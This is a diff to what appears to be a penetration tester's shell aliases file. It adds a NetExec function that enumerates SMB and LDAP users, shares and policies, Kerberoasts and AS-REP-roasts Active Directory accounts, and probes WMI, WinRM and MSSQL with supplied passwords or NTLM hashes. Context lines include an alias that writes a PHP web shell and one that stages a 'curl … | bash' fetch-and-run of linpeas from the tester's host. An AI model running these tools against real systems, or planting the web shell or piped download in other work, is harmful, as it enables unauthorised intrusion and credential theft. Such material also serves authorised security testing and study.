@@ -17,6 +17,73 @@ alias chiselS="chisel_forward"
 alias phpcmd='echo "<?=\`\$_GET[0]\`?>" > cmd.php && echo "[+] wrote <?=\`\$_GET[0]\`?> in cmd.php"'
 alias linpeas="curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -s --output lin.sh | echo \"curl -L http://${tun0ip}:8000/lin.sh | bash\" | xclip -sel clip && python3 -m http.server 8000"
 
+nxc-scan() {
+    # Check for target argument
+    if [ -z "$1" ]; then
+        echo "❌ Usage: nxc-scan <target> [username] [password/hash]"
+        return 1
+    fi
+
+    local target="$1"
+    local user="$2"
+    local pass_or_hash="$3"
+    
+    local auth_flags=""
+
+    # Build auth flags dynamically if provided
+    if [ -n "$user" ]; then
+        auth_flags+=" -u '$user'"
+    fi
+
+    if [ -n "$pass_or_hash" ]; then
+        # If the password string is exactly 32 hex characters, treat it as an NTLM hash
+        if [[ ${#pass_or_hash} -eq 32 && "$pass_or_hash" =~ ^[0-9a-fA-F]+$ ]]; then
+            auth_flags+=" -H '$pass_or_hash'"
+        else
+            auth_flags+=" -p '$pass_or_hash'"
+        fi
+    else
+        # If a user was provided but no password, check null pass. If no user either, force empty strings.
+        if [ -z "$user" ]; then
+            auth_flags+=" -u '' -p ''"
+        fi
+    fi
+
+    echo "=================================================="
+    echo "Running NetExec Suite against: $target"
+    echo "Auth context: ${auth_flags:-Anonymous}"
+    echo "=================================================="
+
+    # --- SMB Protocol ---
+    echo -e "\n[+] Testing SMB Shares & Policies..."
+    eval "nxc smb $target $auth_flags --shares"
+    eval "nxc smb $target $auth_flags --pass-pol"
+    
+    echo -e "\n[+] Enumerating SMB Users..."
+    eval "nxc smb $target $auth_flags --users"
+
+    # --- LDAP Protocol ---
+    echo -e "\n[+] Testing LDAP Enumeration..."
+    eval "nxc ldap $target $auth_flags --users-export nxc_users.txt"
+    eval "nxc ldap $target $auth_flags --groups"
+
+    echo -e "\n[+] Checking Active Directory Attacks (Kerberoasting/AS-REP)..."
+    eval "nxc ldap $target $auth_flags --asreproast nxc_asrep.txt"
+    eval "nxc ldap $target $auth_flags --kerberoast nxc_kerb.txt"
+
+    # --- Auxiliary Protcols (WMI, WinRM, MSSQL) ---
+    echo -e "\n[+] Testing WMI & WinRM access..."
+    eval "nxc wmi $target $auth_flags --local-auth"
+    eval "nxc winrm $target $auth_flags"
+
+    echo -e "\n[+] Testing Database Privileges (MSSQL)..."
+    eval "nxc mssql $target $auth_flags"
+    
+    echo -e "\n=================================================="
+    echo "🏁 Scan complete. Outputs saved to nxc_*.txt if successful."
+    echo "=================================================="
+}
+
 cap() {
 		
     if [ "$#" -lt 1 ]; then
